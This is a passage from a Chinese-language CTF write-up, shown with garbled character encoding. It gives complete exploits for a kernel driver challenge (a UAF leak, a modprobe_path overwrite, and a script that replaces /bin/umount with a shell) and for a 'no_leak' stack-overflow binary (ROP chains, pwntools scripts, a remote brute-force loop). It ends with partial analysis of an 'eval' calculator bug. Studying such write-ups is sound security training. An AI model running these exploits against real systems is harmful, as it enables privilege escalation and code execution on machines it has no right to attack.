        "mov r15, 0x15151515;"      // 
        "mov r14, pop_rax_ret;"      // 1
        "mov r13, 0x782f706d742f;"      // 2
        "mov r12, pop_rdi_ret;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, mov_ptr_rdi_rax_ret;"      // 7
        "mov rbp, modprobe_path_addr;"      // 4
        "mov rbx, pop_rbp_ret;"      // 5
        "mov r9, do_task_dead_func;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
}


int main(){
    g_fd  = open("/dev/rwctf",2);
    prepare();
    hijack();
}
```


éš¾ç‚¹åœ¨äºleakåç§»ï¼Œè¿™é‡Œç”¨çš„æ˜¯åŠ«æŒuser_key_payloadçš„æ–¹æ³•ï¼Œåˆ©ç”¨UAFåŠ«æŒuser_key_payloadç»“æ„ä½“ï¼Œæ³„éœ²å†…æ ¸å †ä¸Šçš„å†…å®¹ï¼Œå†ç»“åˆkey_revoke+add_keyå †å–·ï¼Œå°±èƒ½æ³„éœ²user_free_payload_rcuåœ°å€ä»è€Œæ‹¿åˆ°kernelbase

#### æ–¹æ³•äºŒ



```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>

#define OBJSIZE 0x20
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

int g_fd;
int64_t g_kernel_base;
int64_t kernel_elf_base = 0xffffffff81000000;
int64_t modprobe_path_addr = 0xffffffff828510a0;

struct rwstruct{
    unsigned int idx;
    unsigned int size;
    char* con;
};


int rwctf_ioctl_kmalloc(int idx, int size, char* con){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = size;
    rw_buf.con = con;
    ioctl(g_fd,0xDEADBEEF,&rw_buf);
}

int rwctf_ioctl_kfree(int idx){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = 0;
    rw_buf.con = 0;
    ioctl(g_fd,0xC0DECAFE,&rw_buf);
}


int g_msqid;
struct g_msgp{
  long type;
  char mtext[0xfe8];    // 0x1000-0x30+0x20-0x8 = 0xFE8
};

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}

int msg_msgget(key_t key,int msgflg) 
{
    int msqid;
    if((msqid = msgget(key,msgflg)) == -1){              
        perror("msgget");
        exit(-1);
    }
    return msqid;
}

void msg_msgsnd(int msqid,void *msgp,size_t msgsz,int msgflg) 
{
    if(msgsnd(msqid,msgp,msgsz,msgflg) == -1){          
        perror("msgsnd");
        exit(-1);
    }
}

ssize_t msg_msgrcv(int msqid,void *msgp,size_t msgsz,long msgtyp,int msgflg) 
{
    ssize_t result;
    result = msgrcv(msqid,msgp,msgsz,msgtyp,msgflg);           
    if (result<0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return result;
}

void msg_msgctl(int msqid,int cmd,struct msqid_ds *buf)         
{
    if ((msgctl(msqid,cmd,buf))==-1)                        // åˆ é™¤é˜Ÿåˆ— msg_msgctl(msqid,IPC_RMID,NULL);
    {
        perror("Msgctl");
        exit(-1);
    }
}

void create_shm_file_data()
{
    int shmid;
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
      perror("shmget");
      exit(0);
    }
    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1) {
      perror("shmat");
      exit(0);
    }
}


void prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("echo '\nchmod 777 /flag' >> /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}


int aaw(int64_t *aim_addr, char *shell_addr){
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);
    rwctf_ioctl_kfree(0);

    memcpy(buf+0x10,aim_addr,8);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kmalloc(0,OBJSIZE,shell_addr);
}

int leak(){
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);

    struct g_msgp msgp;
    msgp.type = 1;   
    memset(msgp.mtext,'a',0xfe8);
    g_msqid = msg_msgget(IPC_PRIVATE,IPC_CREAT|0666);
    msg_msgsnd(g_msqid,&msgp,sizeof(msgp.mtext),0);

    rwctf_ioctl_kfree(0);
    create_shm_file_data();
    
    char* recv_msg = malloc(0x1000);
    msg_msgrcv(g_msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);
    // hexdump(recv_msg,0x1000);
    g_kernel_base = *(int64_t *)&recv_msg[0xfd8]- 0x19ac6c0;
    printf("[+] kernel base is : 0x%lx\n",g_kernel_base);
    free(buf);
    free(recv_msg);
}

int main(){
    g_fd = open("/dev/rwctf",2);
    prepare();
    leak();
    modprobe_path_addr = modprobe_path_addr - kernel_elf_base + g_kernel_base;
    char *buf  = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    memcpy(buf,"/tmp/x\x00",7);
    aaw(&modprobe_path_addr,buf);
    return 0;
}
```












https://bbs.kanxue.com/thread-279787.htm

https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/



### no_leak

é¢˜ç›®ä¸»è¦æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæ²¡æœ‰ä»»ä½•ç”¨äºè¾“å‡ºçš„å‡½æ•°

```bash
[*] '/mnt/hgfs/ctf/pwnchall/no_leak/no_leak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ç”±äºæ²¡æœ‰åœ°å€éšæœºåŒ–ï¼Œæˆ‘ä»¬æŒæ¡çš„åœ°å€æœ‰ç¨‹åºæ‰€æœ‰çš„åŸºå€ï¼Œå³gotè¡¨ã€bssæ®µåœ°å€ã€ç¨‹åºè‡ªèº«çš„gadgetç­‰

è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘csuçš„gadgetï¼ˆFull RELROæˆ‘ä»¬å¯ä»¥ä½¿ç”¨call gotè¡¨ã€æ²¡æœ‰PIEæœ‰åœ°å€ã€ç¼ºå°‘gadgetï¼‰

å¦‚ä½•æ‹¿åˆ°libcåœ°å€å°±æ˜¯å…³é”®

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  alarm(0x3Cu);
  read(0, buf, 0x100uLL);
  return 0;
}
```



#### åˆ©ç”¨__libc_start_mainå‡½æ•°åœ¨bssæ®µä¸Šå¸ƒç½®libcåœ°å€

è¿™ç§æ€è·¯ä¸»è¦æ˜¯æ”¾å¼ƒæ³„éœ²libcï¼Œåªè¦libcåœ°å€åœ¨å·²çŸ¥åœ°å€ä¸ºæˆ‘ä»¬æ‰€ç”¨å³å¯

åˆ©ç”¨gadgetå¯¹bssæ®µä¸Šæ®‹ç•™çš„libcåœ°å€è¿›è¡ŒåŠ å‡å¾—åˆ°systemï¼Œå†é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨bssåœ°å€ä¸Šçš„systemå‡½æ•°

csuçš„ä¼˜ç‚¹ä¹‹ä¸€å°±æ˜¯èƒ½æ§åˆ¶rbpå’Œrbxå¯„å­˜å™¨

æˆ‘ä»¬æœç´¢ä¸€ä¸‹gadget

```bash
âœ  no_leak ROPgadget --binary no_leak | grep "bp"
0x000000000040052c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x000000000040052d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040052e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040052f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x00000000004004a9 : je 0x4004b8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004004eb : je 0x4004f8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004006db : jmp qword ptr [rbp]
0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret
0x0000000000400532 : mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400531 : mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400534 : pop rbp ; jmp 0x4004c0
0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004004b8 : pop rbp ; ret
0x0000000000400530 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
```

èƒ½ç”¨çš„gadgetè‚¯å®šæ˜¯ä»¥retç»“å°¾çš„ï¼Œå…¶ä¸­åˆè¦èƒ½å¯¹rbxæˆ–è€…rbpé‡Œçš„å†…å®¹è¿›è¡ŒåŠ å‡çš„

```bash
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

è¿™æ¡gadgetèƒ½æ“ä½œrbpé‡Œå­˜æ”¾çš„å€¼ï¼Œæˆ‘ä»¬å¦‚æœæŠŠrbpè®¾ç½®ä¸ºbssåœ°å€å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®çš„

å¦‚ä½•åœ¨bssä¸Šæ®‹ç•™libcåœ°å€å‘¢ï¼Œ__libc_start_mainå‡½æ•°æ‰§è¡Œæ—¶ä¼šåœ¨å‡½æ•°æ‰§è¡Œä½ç½®ä¸Šä¸‹æ–‡æ®‹ç•™ä¸€äº›åœ°å€ï¼Œå…¶ä¸­åŒ…æ‹¬äº†ä¸€äº›libcåœ°å€ã€‚å¦‚`__exit_funcs_lock`ï¼ŒæŠŠ libc_start_mainå‡½æ•°å¸ƒç½®åˆ°bssæ®µä¸Šï¼Œæ ˆè¿ç§»è¿‡å»æ‰§è¡Œï¼Œæ‰§è¡Œçš„å‚æ•°ä¸ºp64(start)+p64(fini)+p64(init)(å®æµ‹æ‰§è¡Œ`_start`æ˜¯è¡Œä¸é€šçš„ï¼Œéœ€è¦æ‰§è¡Œ`__libc_start_main`ï¼‰

> æ ˆè¿ç§»çš„æ–¹å¼æœ‰å¾ˆå¤š
>
> 1.ä¸‰æ¡payload readçš„æ–¹å¼ï¼Œç”¨äºæº¢å‡ºç©ºé—´ä¸å¤§çš„æ ˆæº¢å‡º
>
> 2.åˆ©ç”¨ä¸€æ¡æº¢å‡ºrsu call read_gotï¼Œå†ä¸€æ¡æº¢å‡ºè®¾ç½®rbp leave retçš„æ–¹å¼ï¼Œç”¨äºæœ‰æ¬¡æ•°é™åˆ¶çš„æƒ…å†µ
>
> ......

åœ¨æ–°çš„mainå‡½æ•°æµä¸­æ ˆæº¢å‡ºæ‰§è¡Œæˆ‘ä»¬çš„åŠ å‡gadgetï¼Œè®¡ç®—systemå’Œ__exit_funcs_lockçš„å·®å€¼ã€‚æ•´ä½“çš„æ€è·¯å¦‚ä¸‹æ‰€ç¤ºã€‚

EXPä»…ä¾›å‚è€ƒï¼Œæœ‰å¤šå¤„å¯ä¼˜åŒ–ï¼š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
 
# p = remote("nc.eonew.cn","10002")
p = process("./no_leak")
elf = ELF("./no_leak")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# ru("------------------------------   preload end     ------------------------------")


# 0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
magic = 0x0000000000400518
alarm = 0x600FE0
bss = 0x601400
read = 0x400549

libc_main = elf.got['__libc_start_main']
lg("libc_main")
main = 0x400537
csu2 = 0x4005CA
csu1 = 0x4005B0
fini = 0x4005E0
init = 0x400570
start = 0x400450

pay = 'a'*0x80+p64(bss)+p64(read)
s(pay)

pay = 'a'*0x80+p64(bss+0x80)+p64(read)
s(pay)

pay = p64(0)+p64(csu2)+p64(0)+p64(1)+p64(libc_main)+p64(start)+p64(fini)+p64(init)+p64(csu1)
s(pay)

pay  = 'a'*0x80+p64(bss)+p64(csu2)
pay += p64(0xffffffffffc5ed18)+p64(0x601340+0x3d)+p64(0)*4
pay += p64(magic)+p64(main)
s(pay)

# dbg()
pay ='/bin/sh\x00'+'b'*0x80+p64(csu2)
pay += p64(0)+p64(1)+p64(0x601340)+p64(0x601268)+p64(0)+p64(0)+p64(csu1)
s(pay)
# p.recv(timeout=0.2)
# p.recv(timeout=0.2)

ia()
```

#### åˆ©ç”¨__libc_start_mainä¸­çš„è¾“å‡ºå‡½æ•°gadgetæ³„éœ²libc

æœ€å¥½çš„æƒ…å†µæ˜¯æŠŠlibcæ³„éœ²å‡ºæ¥æ–¹ä¾¿æˆ‘ä»¬è®¡ç®—ï¼Œå¯»æ±‚æ³„éœ²å‡½æ•°åªèƒ½æ±‚äºlibcï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ¨libcå‡½æ•°æµç¨‹ä¸­å­˜åœ¨ä¸€ä¸ªè¾“å‡ºå‡½æ•°ç‰‡æ®µ

```
.text:0000000000021B3B                               loc_21B3B:                              ; CODE XREF: __libc_start_main+8Fâ†‘j
.text:0000000000021B3B 48 8B 44 24 08                mov     rax, [rsp+0B8h+var_B0]
.text:0000000000021B40 48 8B 15 11 C3 38 00          mov     rdx, cs:_rtld_global_ro_ptr
.text:0000000000021B47 48 8D 3D A1 3C 15 00          lea     rdi, aTransferringCo            ; "\ntransferring control: %s\n\n"
.text:0000000000021B4E 48 8B 30                      mov     rsi, [rax]
.text:0000000000021B51 31 C0                         xor     eax, eax
.text:0000000000021B53 FF 92 68 01 00 00             call    qword ptr [rdx+168h]
.text:0000000000021B53
.text:0000000000021B59 E9 D7 FE FF FF                jmp     loc_21A35
```

ä¼šè¾“å‡ºraxçš„å†…å®¹ï¼Œè€Œraxæ¥è‡ªäºrsp+0x8+var_B0ï¼Œç»“åˆæˆ‘ä»¬å·²ç»æœ‰äº†æº¢å‡ºï¼Œraxä¼¼ä¹æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå¦‚æœæ§åˆ¶ä¸ºgotè¡¨é¡¹å°±èƒ½æ³„éœ²libcã€‚

è€Œjmp loc_21A35åˆ™æ˜¯è·³è½¬åˆ°`__libc_start_main`çš„ä¸»é€»è¾‘éƒ¨åˆ†æ­£å¸¸æ‰§è¡Œï¼Œæ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚

```
.text:0000000000021A35                               loc_21A35:                              ; CODE XREF: __libc_start_main+1B9â†“j
.text:0000000000021A35 48 8D 7C 24 20                lea     rdi, [rsp+0B8h+var_98]          ; env
.text:0000000000021A3A E8 F1 29 01 00                call    _setjmp
.text:0000000000021A3A
.text:0000000000021A3F 85 C0                         test    eax, eax
.text:0000000000021A41 75 4B                         jnz     short loc_21A8E
.text:0000000000021A41
.text:0000000000021A43 64 48 8B 04 25 00 03 00 00    mov     rax, fs:300h
.text:0000000000021A4C 48 89 44 24 68                mov     [rsp+0B8h+var_50], rax
.text:0000000000021A51 64 48 8B 04 25 F8 02 00 00    mov     rax, fs:2F8h
.text:0000000000021A5A 48 89 44 24 70                mov     [rsp+0B8h+var_48], rax
.text:0000000000021A5F 48 8D 44 24 20                lea     rax, [rsp+0B8h+var_98]
.text:0000000000021A64 64 48 89 04 25 00 03 00 00    mov     fs:300h, rax
.text:0000000000021A6D 48 8B 05 34 C4 38 00          mov     rax, cs:environ_ptr
.text:0000000000021A74 48 8B 74 24 08                mov     rsi, [rsp+0B8h+var_B0]
.text:0000000000021A79 8B 7C 24 14                   mov     edi, [rsp+0B8h+var_A4]
.text:0000000000021A7D 48 8B 10                      mov     rdx, [rax]
.text:0000000000021A80 48 8B 44 24 18                mov     rax, [rsp+0B8h+var_A0]
.text:0000000000021A85 FF D0                         call    rax
.text:0000000000021A85
.text:0000000000021A87
.text:0000000000021A87                               loc_21A87:                              ; CODE XREF: __libc_start_main+156â†“j
.text:0000000000021A87 89 C7                         mov     edi, eax
.text:0000000000021A89 E8 12 53 01 00                call    exit
```



æˆ‘ä»¬æ³¨æ„åˆ°è¿”å›åœ°å€æœ¬å°±æ˜¯`__libc_start_main`åŠ ä¸Šåç§»çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬çˆ†ç ´0x21B3B åœ°å€ï¼Œæ¥å®ç°åŠŸèƒ½ã€‚å†æ ¹æ®åŠ¨è°ƒåˆ¤æ–­æ‰§è¡Œmov     rax, [rsp+0B8h+var_B0]æ—¶å–çš„æ˜¯æ ˆä¸Šçš„å“ªä¸ªå€¼ï¼Œæº¢å‡ºè¦†ç›–å³å¯ã€‚

```python
# ç¬¬ä¸€æ¬¡æº¢å‡º
p =  'a' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 
```

æ‹¿åˆ°libcåå°±ä¸å†èµ˜è¿°ï¼Œropå³å¯



EXPä»…ä¾›å‚è€ƒï¼Œæœ‰å¤šå¤„å¯ä¼˜åŒ–ï¼š

```python
# _*_ coding:utf-8 _*_
from pwn import *

context.log_level = 'debug'
elf = ELF('./no_leak')
libc_path = './libc.so.6'
libc = ELF(libc_path)
io = elf.process()
# io = remote('nc.eonew.cn', 10002)

# io.recvuntil("------------------------------   preload end     ------------------------------\n")

context.terminal = ['tmux', 'splitw', '-hp','64']

def dbg(breakpoint=''):
    gdb.attach(io)
    pause()

# dbg()

_start = 0x400450
leave = 0x400564
main = 0x400537
pop_rdi = 0x00000000004005d3 # pop rdi ; ret
pop_rsi_r15 = 0x00000000004005d1 # pop rsi ; pop r15 ; ret
__libc_csu_init_gadget      = 0x4005CB # __libc_scu_init pop_5_ret
__libc_csu_init_gadget_call = 0x4005B0 #
buf = elf.bss() + 0x800
rbp = buf - 8

p = b'A' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 

io.send(p)

# leak libc
p =  b'A' * 0x88
p += b'\x3b\x7b'

io.send(p)
libc_base = u64(io.recvuntil('\x7f')[-6:] + b'\x00\x00') - libc.sym['read']
print('libc_base: ' + hex(libc_base))
sleep(0.5)

p = b'A' * 0x80 + b'/bin/sh\x00'
p += p64(pop_rdi)
p += p64(0x601740)
p += p64(libc_base + libc.sym['system'])
io.send(p)

io.interactive()
```



#### ç›´æ¥æº¢å‡ºçˆ†ç ´one_gadget

æ—¢ç„¶èƒ½çˆ†ç ´ï¼Œé‚£è‡ªç„¶ç›´æ¥çˆ†ç ´one_gadgetä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¦‚ç‡æ¯”è¾ƒä½å°±æ˜¯äº†

```python
from pwn import *

count=1

while True:
        io=remote("nc.eonew.cn",10002)
        io.send('A'*0x80+'A'*8+'\xa6\x15\x04')
        io.recv()
        print(count)
        count += 1
        try:    
                io.recv(timeout=0.2)
                io.recv(timeout=0.2)
        except:
                io.close()
                continue
        break
io.interactive()
```



### eval

è¿™é¢˜æ˜¯2023æŸé¹­æ¯çš„ä¸€é“è®¡ç®—å™¨çš„é¢˜ç›®ï¼Œé€†å‘éš¾åº¦è¿˜æ˜¯æ¯”è¾ƒå¤§çš„

è¿™é¢˜çš„åˆ‡å…¥ç‚¹æ˜¯ä»ä¸€ä¸ªcrashå¼€å§‹ï¼Œå¦‚æœå·²çŸ¥crashè¯¥å¦‚ä½•åˆ†æé¢˜ç›®å¹¶ç¼–å†™è„šæœ¬

```shell
âœ  2023bolucup ./eval
+23232323232323
[1]    72101 segmentation fault (core dumped)  ./eval
```

è¿›ä¸€æ­¥æµ‹è¯•ï¼Œä¼šå‘ç°ä¼šè¾“å‡ºä¸€äº›æ ˆåœ°å€

```shell
âœ  2023bolucup ./eval
+100
140725581820903
```

è¿™æ„å‘³ç€å®ƒçš„è¾“å‡ºç»“æœæ˜¯å­˜åœ¨è¶Šç•Œçš„

æ¥çœ‹å®ƒçš„å¤„ç†å‡½æ•°ï¼Œè¾“å‡ºå‡½æ•°è¾“å‡ºçš„æ˜¯res+0x18 + *(res+0x18)\*8ï¼Œé‚£ä¹ˆè¶Šç•Œææœ‰å¯èƒ½å°±æ˜¯\*(res+18)å¯¼è‡´çš„

```c
int __fastcall vuln(const char *buf, __int64 result)
{
  char num; // [rsp+1Fh] [rbp-11h]
  const char *nextnum; // [rsp+20h] [rbp-10h]
  __int64 i; // [rsp+28h] [rbp-8h]

  memset(result, 0, 0xA0uLL);
  nextnum = buf;
  for ( i = 0LL; ; ++i )
  {
    num = buf[i];
    if ( !isfuhao(num) )
      break;
    sub_DC9(result, nextnum, &buf[i]);
    if ( !isNum(buf[i + 1]) )
      error();
    sub_CB1(result, num);
    nextnum = &buf[i + 1];
LABEL_8:
    ;
  }
  if ( num )
    goto LABEL_8;
  sub_DC9(result, nextnum, &buf[i]);
  while ( *result )
    sub_AC7(result);
  return printf("%ld\n", *(result + 8 * (*(result + 0x18) - 1LL + 4)));
}
```

å†æ¥çœ‹ç¨‹åº

å¦‚æœæˆ‘ä»¬è¾“å…¥+100ï¼Œè¿›å…¥forå¾ªç¯ååˆ¤æ–­+ä¸ºç¬¦å·ï¼Œç„¶åå°±è¿›å…¥sub_DC9ï¼Œç¬¦å·ç½®ä¸º0ï¼Œstrtolè¿”å›0ï¼Œç»§ç»­å¾ªç¯ï¼Œåˆ¤æ–­å…¶åæ˜¯å¦ä¸ºæ•°å­—ï¼Œè¿›å…¥sub_CB1ï¼Œæ­¤æ—¶çš„resè¿˜ä¸º0ï¼Œå°†å…¶+1,å°†+ç¬¦å·èµ‹ç»™(res+8)ï¼Œå°±è¿”å›0äº†ã€‚

ç„¶åè¿›å…¥ä¸‹ä¸€æ¬¡forå¾ªç¯ï¼Œåªè¦è¯»åˆ°çš„æ˜¯æ•°å­—åˆ™è·³è¿‡ï¼Œç›´åˆ°è¯»åˆ°0ã€‚ç„¶åå†è¿›è¡Œä¸€æ¬¡sub_DC9ï¼Œå°†å…¶åçš„æ•°å­—(å­—ç¬¦ä¸²)è½¬åŒ–ä¸ºlong intï¼Œåˆå§‹åŒ–(res+0x18)ä¸º1ï¼Œå°†long int æ”¾å…¥(res+0x20)

```c
_BYTE *__fastcall sub_DC9(__int64 a1, const char *a2, _BYTE *a3)
{
  _BYTE *result; // rax
  __int64 v4; // rax
  __int64 v5; // rcx
  char v7; // [rsp+27h] [rbp-9h]
  _BYTE *v8; // [rsp+28h] [rbp-8h]

  if ( *a2 == '0' )
    error();
  v7 = *a3;
  *a3 = 0;                                      // ç¬¦å·å€¼ä¸ºé›¶
  v8 = strtol(a2, 0LL, 10);
  result = a3;
  *a3 = v7;
  if ( v8 )
  {
    v4 = *(a1 + 0x18);
    *(a1 + 0x18) = v4 + 1;
    v5 = v4 + 4;
    result = v8;
    *(a1 + 8 * v5) = v8;                        // æ•°å­—
  }
  return result;
}
```

```c
__int64 __fastcall sub_CB1(_QWORD *res, char num)
{
  __int64 s; // rax

  if ( !*res )
  {
    s = (*res)++;
    *(res + s + 8) = num;
    return s;
  }
  if ( num != '+' )
  {
    if ( num <= '+' )
    {
      if ( num != '*' )
LABEL_16:
        error();
      goto LABEL_8;
    }
    if ( num != '-' )
    {
      if ( num != '/' )
        goto LABEL_16;
LABEL_8:
      if ( sub_91A(*(res + *res + 7)) )
        sub_AC7(res);
      if ( *res > 0xEuLL )
        error();
      s = (*res)++;
      *(res + s + 8) = num;
      return s;
    }
  }
  sub_AC7(res);
  if ( *res > 0xEuLL )
    error();
  s = (*res)++;
  *(res + s + 8) = num;
  return s;
}
```

ç”±äºresä¸º1ï¼Œæ¥ä¸‹æ¥è¿›å…¥åˆ°sub_AC7ï¼Œå¯¹res-1ï¼Œåˆå˜ä¸º0ï¼Œè¯»å–ç¬¦å·ï¼Œæ ¹æ®ç¬¦å·æ¥å¯¹åŸºäº(res + 0x18)è¿›è¡ŒåŠ å‡æ³•æ“ä½œï¼Œ*(res+0x20ï¼‰+1 èµ‹å€¼ç»™ *(res+0x18) ï¼Œ *(res+0x18) åˆå‡ä¸€ã€‚

```c
struc_2 *__fastcall sub_AC7(__int64 a1)
{
  struc_2 *result; // rax
  int v2; // eax

  result = *a1;
  if ( *a1 )
  {
    --*a1;
    v2 = *(a1 + *a1 + 8);
    if ( v2 == '+' )
    {
      *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) += *(a1 + 8 * (*(a1 + 0x18) - 1LL + 4));
    }
    else if ( v2 > '+' )
    {
      if ( v2 == '-' )
      {
        *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) -= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
      else
      {
        if ( v2 != '/' )
LABEL_15:
          error();
        if ( !*(a1 + 8 * (*(a1 + 24) - 1LL + 4)) )
          error();
        *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) /= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
    }
    else
    {
      if ( v2 != '*' )
        goto LABEL_15;
      *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) *= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
    }
    result = a1;
    --*(a1 + 0x18);
  }
  return result;
}
```

èµ°åˆ°è¿™åº”è¯¥å°±æ˜ç™½äº†(res+0x18)æ˜¯ä¸€ä¸ªåç§»é‡ï¼Œä½†å®ƒçš„å€¼å´æ˜¯(res+0x20)è¿™ä¸ªç”±æˆ‘ä»¬è¾“å…¥çš„æ•°å­—è®¾ç½®çš„ã€‚

æ¥ä¸‹æ¥æ³„éœ²libcå³å¯ï¼Œæ—¢ç„¶(res+0x18)æ˜¯ä¸€ä¸ªå†™å…¥åç§»ï¼Œé‚£ç¬¬äºŒæ¬¡å†™å…¥æ•°å­—çš„åç§»å°±åŒæ ·æ”¹å˜ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™

